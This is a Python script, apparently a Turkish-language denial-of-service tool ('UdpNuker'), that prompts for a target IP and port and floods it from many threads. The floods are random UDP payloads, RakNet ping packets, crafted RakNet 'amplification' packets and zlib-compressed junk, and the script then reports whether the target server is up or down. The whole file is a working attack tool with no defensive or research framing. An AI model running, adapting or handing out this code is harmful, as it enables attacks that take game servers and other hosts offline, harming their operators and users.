import socket
import requests
import os
import time
import random
import threading
import zlib

packet_count = 0

def udpflood(target_ip, target_port):
    global packet_count
    fake_pids = [
      b'\x01',
      b'\x05',
      b'\x07',
      b'\x84',
      b'\x13'
    ]
    magic_bytes = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        rawbytes = os.urandom(9983)
        for i in range(300):
            fake_pid = random.choice(fake_pids)
            packet = fake_pid + magic_bytes + rawbytes
            s.sendto(packet, (target_ip, target_port))
            packet_count += 1
        s.close()
		
def ping_flood(target_ip, target_port):
    global packet_count
    ping_packet = bytes.fromhex("01000000000000000000ffff00fefefefefdfdfdfd12345678")
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for i in range(500):
            s.sendto(ping_packet, (target_ip, target_port))
            packet_count += 1
        s.close()
        
def raknet_amplification(target_ip, target_port):
    global packet_count
    packets = [
       b'\x05\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78\x0a' + b'\x00' * 1464,
       b'\x07\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78\x04\x80\xff\xff\xfe\x4a\xbc\x05\xd4\x12\x34\x56\x78\x90\xab\xcd\xef',
       b'\x84\xfc\x03\x00\x40\x00\x48\x0c\x04\x00\x00\x00\x00\x00\x00\x00\x02\x03\x6c',
       b'\x84\x0b\x04\x00\x00\x00\x48\x00\x00\x00\x00\x00\x00\x02\x43\x15',
       b'\x84\x08\x04\x00\x60\x01\x20\x15\x04\x00\xfb\x03\x00\x00\x8e\x9d\x00\x00\x00\x00\x00\x00\x00\x00\x43\x35\x56\x94\x42\x8f\x3d\x71\x43\x1d\xc8\x33\x43\xad\x50\x92\x43\xad\x50\x92\x42\x20\x88\xc9\x00\x01',
       b'\xc0\x00\x01\x00\x00\x00',
       b'\xa0\x00\x01\x00\x00\x00',
       b'\x84\x00\x00\x01\x40\x00\x00\x00\x00\x80\xff\xff\xff\xff\x00\x01\x00\x00\x01',
       b'\x84\x00\x00\x01\x40\x00\x00\x00\x00\x80\xff\xff\xff\xff\x00\x01\x00\x00\x01',
       b'\x84\x00\x00\x02\x00\x00\x08\x8d\xff\xff\x00\x00\x78\x9c\x01\x00\x00\xff\xff'
    ]
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for i in range(500):
            packet = random.choice(packets)
            s.sendto(packet, (target_ip, target_port))
            packet_count += 1
        s.close()
         
def zlib_bomber(target_ip, target_port):
    global packet_count
    packet_pids = [
       b'\x05',
       b'\x07',
       b'\x84',
       b'\x01',
       b'\x13'
    ]
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for i in range(300):
            bytelen = random.randint(512, 1024)
            data_bytes = os.urandom(bytelen)
            compressed_bytes = zlib.compress(data_bytes, level=9)
            pid = random.choice(packet_pids)
            packet = pid + compressed_bytes
            s.sendto(packet, (target_ip, target_port))
            packet_count += 1
        s.close()
            
         	
         
banner = """
  /$$   /$$       /$$           /$$   /$$           /$$                          
| $$  | $$      | $$          | $$$ | $$          | $$                          
| $$  | $$  /$$$$$$$  /$$$$$$ | $$$$| $$ /$$   /$$| $$   /$$  /$$$$$$   /$$$$$$ 
| $$  | $$ /$$__  $$ /$$__  $$| $$ $$ $$| $$  | $$| $$  /$$/ /$$__  $$ /$$__  $$
| $$  | $$| $$  | $$| $$  \ $$| $$  $$$$| $$  | $$| $$$$$$/ | $$$$$$$$| $$  \__/
| $$  | $$| $$  | $$| $$  | $$| $$\  $$$| $$  | $$| $$_  $$ | $$_____/| $$      
|  $$$$$$/|  $$$$$$$| $$$$$$$/| $$ \  $$|  $$$$$$/| $$ \  $$|  $$$$$$$| $$      
 \______/  \_______/| $$____/ |__/  \__/ \______/ |__/  \__/ \_______/|__/      
                    | $$                                                        
                    | $$                                                        
                    |__/
@stromer4len tarafından kodlanmıştır.
"""
my_ip = requests.get("https://api.ipify.org").text

try:
    os.system("clear")
    print("\033[32m" + banner)
    print(f"\033[31m[!] Public IP Adresiniz: {my_ip}")
    print(" ")
    target_ip = input("\033[33m[>>] Hedef IP: ")
    target_port = int(input("\033[33m[>>] Hedef Port: "))
    areusure = input(f"[~] Başlatmak İçin Entera Basın.")
    for i in range(50):
      t1 = threading.Thread(target=udpflood,args=(target_ip, target_port), daemon=True)
      t2 = threading.Thread(target=ping_flood,args=(target_ip, target_port), daemon=True)
      t3 = threading.Thread(target=raknet_amplification,args=(target_ip, target_port), daemon=True)
      t4 = threading.Thread(target=zlib_bomber,args=(target_ip, target_port), daemon=True)
      t2.start()
      t3.start()
      t4.start()
      os.system("clear")
      print(banner)
      print(" ")
      print(f"\033[31m[!] Saldırılıyor! {target_ip}:{target_port}  - Durdurmak İçin CTRL + C Kullanınız..")
      print(" ")
      query_packet = bytes.fromhex("01000000000000000000ffff00fefefefefdfdfdfd12345678")
      query_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      while True:
        try:
          print(f"\033[33m[!] {target_ip}:{target_port} Saldırılıyor... [✓] Toplam Gönderilen Paket: {packet_count}")
          query_socket.sendto(query_packet, (target_ip, target_port))
          query_socket.settimeout(3)
          data = query_socket.recvfrom(1024)
          if data:
            print("\033[32m[>>] Kontrol Ediliyor... Sunucu Açık. (UP)")
        except socket.timeout:
          print("\033[31m[<<] Kontrol Ediliyor... Sunucu Kapalı! (DOWN)")
          pass  
        time.sleep(1)

except ValueError:
    print("[!] Lütfen Verileri Doğru Şekilde Giriniz")
    time.sleep(0.50)
except KeyboardInterrupt:
    print("[!] Program Durduruldu.")
